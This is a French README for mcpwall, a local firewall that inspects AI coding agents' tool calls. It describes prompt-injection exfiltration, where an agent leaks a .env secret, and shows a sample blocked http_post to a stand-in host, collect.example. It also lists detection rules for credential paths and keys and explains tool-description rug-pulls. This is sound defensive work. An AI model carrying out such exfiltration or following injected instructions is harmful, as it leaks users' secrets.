# mcpwall

**Un pare-feu applicatif local pour agents de code.** Little Snitch, mais pour
les appels d'outils des agents IA.

[English](README.md) · [Spécification](SPEC.md) · [Contribuer](CONTRIBUTING.md) · MIT

---

## « Mon client me demande déjà la permission. À quoi bon ? »

Parce que les permissions de votre client portent sur l'**outil**, et qu'elles
disparaissent en auto-accept. Une fois `Bash` autorisé, vous avez autorisé
toutes les commandes qu'il exécutera un jour.

mcpwall filtre au niveau du **contenu des arguments**, tient un **journal
d'audit qui traverse les sessions**, et couvre les **serveurs tiers que vous
avez approuvés il y a six mois** — une bonne fois.

## L'attaque pour laquelle il existe

Vous laissez tourner votre agent en auto-accept. Une issue GitHub, une page web
ou un e-mail contient une injection de prompt. L'agent lit un secret local, puis
l'envoie à un outil réseau.

Votre client, lui, voit une suite d'appels d'outils déjà autorisés. Rien n'a
l'air anormal.

mcpwall retient ce qu'a renvoyé la lecture, le reconnaît dans ce qui s'apprête à
sortir, et arrête l'appel :

```
tools/call  http_post  {"url": "https://collect.example", "body": "rk_live_…"}

→ blocked by mcpwall: tainted local data in an outbound argument
  [local data read from /Users/vous/projet/.env] (rule: taint_exfil)
```

L'agent reçoit cela comme un **échec d'outil ordinaire** : un résultat valide
avec `isError: true`. Il lit le motif, s'adapte, et continue. mcpwall ne ferme
jamais la connexion et ne renvoie jamais d'erreur protocolaire — un pare-feu qui
tue la session est un pare-feu qu'on désinstalle.

## Ce qu'il attrape par défaut

Le `~/.mcpwall/policy.yaml` livré est volontairement court. Seules des règles à
forte confiance interrompent, parce que la fatigue d'alerte est ce qui tue ce
genre d'outil.

| Règle | Se déclenche quand | Action |
| --- | --- | --- |
| `taint_exfil` | une donnée lue localement dans les 10 dernières minutes réapparaît dans un appel sortant | **refus** |
| `secrets_paths` | un argument désigne `.env`, `~/.ssh/**`, `~/.aws/**`, `id_rsa`, `.netrc` | demande |
| `secret_pattern` | un argument ressemble à un identifiant — clé AWS, `ghp_`, `sk-`, clé privée PEM | demande |
| `outside_project_write` | une écriture, édition ou suppression sort du projet courant | demande |
| `tool_description_changed` | un serveur a réécrit la description d'un outil depuis que vous l'avez approuvé | demande |

Seule `taint_exfil` refuse sans demander : il n'existe pas de lecture légitime
d'un secret en train d'être posté sur le réseau. Tout le reste demande, et le
fichier vous appartient — il est rechargé à chaud.

Cette dernière règle, c'est le **rug-pull** : un serveur sert un `tools/list`
honnête pendant qu'on l'examine, et un autre un mois plus tard. La description
n'est pas de la documentation — c'est le texte que votre modèle lit pour décider
quand se servir de l'outil. Le nom et les permissions, eux, n'ont pas bougé.

## Couverture — ce qu'il voit, et ce qu'il ne voit pas

Être honnête sur la couverture est un argument de crédibilité, pas un aveu de
faiblesse.

| | Couvert |
| --- | --- |
| Serveurs MCP en stdio | **oui** |
| Serveurs MCP en streamable HTTP | **oui** — via un proxy local (voir plus bas) |
| Outils intégrés de Claude Code (`Read`, `Edit`, `Bash`, `WebFetch`) | **oui** — hooks `PreToolUse` / `PostToolUse` |
| Cursor | trafic MCP uniquement |
| Outils intégrés de Codex | **non** — son modèle de sécurité passe par le bac à sable |

**Les outils intégrés de Claude Code ne passent jamais par MCP**, et ils
constituent l'essentiel de la surface d'attaque. Un proxy seul surveillerait la
mauvaise porte : toute l'attaque décrite plus haut peut se dérouler avec `Bash`
et `WebFetch`, sans le moindre serveur. `mcpwall init` installe un hook qui
répond au même daemon, à la même policy et au même journal, pour que ce chemin
soit couvert aussi.

**Le streamable HTTP fonctionne autrement, et mieux vaut le savoir avant de s'y
fier.** Un serveur stdio est *démarré par votre client*, avec mcpwall comme
commande — si mcpwall est absent, le serveur démarre quand même. Un client HTTP
ouvre une socket vers une URL : le seul moyen de s'interposer est d'**être**
l'URL. `init` redirige donc votre configuration vers un proxy local sur
`127.0.0.1`. Tant que ce proxy est arrêté, les serveurs qui passent par lui sont
injoignables. Il n'y a pas de repli permissif, parce qu'il ne reste rien vers
quoi se replier. L'app le supervise, et `mcpwall restore` remet vos URLs
d'origine.

## Comment ça s'assemble

```
client MCP ──stdio/http──▶ shim mcpwall ──▶ serveur MCP amont
                                │
Claude Code ──hook PreToolUse───┤   socket Unix (verdict)
                                ▼
                        daemon mcpwall ──▶ journal SQLite
                     (policy · taint · drift)
                                │
                        app barre de menus
```

Un seul binaire à sous-commandes, pour qu'un shim et un daemon ne puissent
jamais diverger en version. Un daemon par machine. Le shim est volontairement
bête — analyser, relayer, demander un verdict, l'appliquer — et toute la logique
vit dans le daemon. L'app macOS ne réimplémente pas le daemon : elle le
supervise comme processus fils.

**Il ne se met pas en travers.** Latence de passage mesurée, en release :

| | p50 | p99 |
| --- | --- | --- |
| trame courte | 1,4 µs | 5,3 µs |
| méthode hors de la fenêtre de scan | 3,0 µs | 10,0 µs |
| trame de 100 Ko | 47 µs | 110 µs |

Le budget est de 5 ms, et la CI échoue s'il est dépassé.

## Installation

```sh
./scripts/build-app.sh
open build/mcpwall.app
```

L'app démarre le daemon, crée un lien symbolique stable vers le binaire, et
propose de s'installer dans vos clients MCP au premier lancement — **en vous
montrant le diff avant d'écrire quoi que ce soit**. Les configurations pointent
vers le lien, jamais vers le bundle : déplacer l'app ne peut donc pas casser vos
serveurs.

> ⚠️ **Pas encore de build distribuable.** Le `.dmg` n'est ni signé ni notarisé,
> donc Gatekeeper impose un clic droit → Ouvrir — précisément la friction qu'une
> installation « sans terminal » est censée supprimer. La signature demande une
> identité Developer ID ; Sparkle demande un flux publié et une paire de clés
> EdDSA. Ni l'un ni l'autre n'existe.
> Voir [l'issue #6](https://github.com/Itaromi/mcpwall/issues/6).

### En ligne de commande, sans interface

```sh
cargo build --release

# 1. le daemon, qui écrit une policy par défaut au premier lancement
./target/release/mcpwall daemon &

# 2. voir ce que init ferait — rien n'est écrit sans --apply
./target/release/mcpwall init

# 3. l'appliquer, puis redémarrer vos clients MCP
./target/release/mcpwall init --apply

# 4. regarder passer le trafic
./target/release/mcpwall log --follow
./target/release/mcpwall log --stats
```

`mcpwall restore` remet chaque configuration depuis sa sauvegarde, en une
commande.

Sans l'app lancée, une règle `ask` **bloque** au lieu de demander — il n'y a
personne pour confirmer. Le message renvoyé à l'agent le dit explicitement, pour
que vous ne restiez jamais à vous demander pourquoi un outil a échoué.

## Principes

- **Local d'abord.** Aucune télémétrie, aucun compte, aucune requête sortante
  hors la vérification de mise à jour.
- **Déterministe.** Aucune analyse des appels par un LLM. La policy est un
  fichier lisible et prévisible : on le lit de haut en bas, la première règle qui
  correspond gagne.
- **Disponible par défaut.** Si le daemon est injoignable, le trafic passe.
  Casser tous vos serveurs MCP parce qu'une app est fermée est un défaut, pas une
  posture de sécurité.
- **Discret.** Seules les règles à forte confiance interrompent. Une règle qui se
  déclenche à tort vous apprend à cliquer « autoriser » sans lire, ce qui annule
  tout l'intérêt du produit.
- **Il ne conserve jamais vos secrets.** Le magasin de taint ne contient que des
  empreintes 64 bits. Il peut dire *ceci est sorti* ; il ne peut jamais rendre
  *quoi*.

## Développement

```sh
cargo test                                          # 228 tests, faux serveurs compris
cargo clippy --workspace --all-targets -- -D warnings
cargo fmt --check
cargo test --release --test bench -- --nocapture     # latence, seuil p99 de 5 ms

cd app && swift build                               # l'application
```

La CI fait tourner le core sur **macOS et Linux** — le produit est macOS, mais le
core doit rester portable.

La suite de tests démarre de vrais processus à dessein : de faux serveurs MCP qui
renvoient du JSON malformé, ignorent `SIGTERM`, meurent au milieu d'un message,
répondent 8 Mo, ou réécrivent leurs descriptions d'outils entre deux listings.
Les défauts que cela vise — orphelins, interblocages, descripteurs mal fermés —
sont exactement ceux qu'aucun test mocké ne verra jamais.

Le build universel de l'app demande Xcode ; avec les seuls Command Line Tools,
`scripts/build-app.sh` se rabat sur l'architecture native et vous prévient. La CI
vérifie que les binaires publiés sont réellement universels.

## Décisions de conception

[SPEC.md](SPEC.md) est le document de référence, et son journal de décisions
consigne le pourquoi de chaque choix — y compris ceux qui se sont d'abord
révélés faux. Si vous vous apprêtez à demander « mais pourquoi diable est-ce
fait comme ça », la réponse y est probablement.

## Licence

MIT.
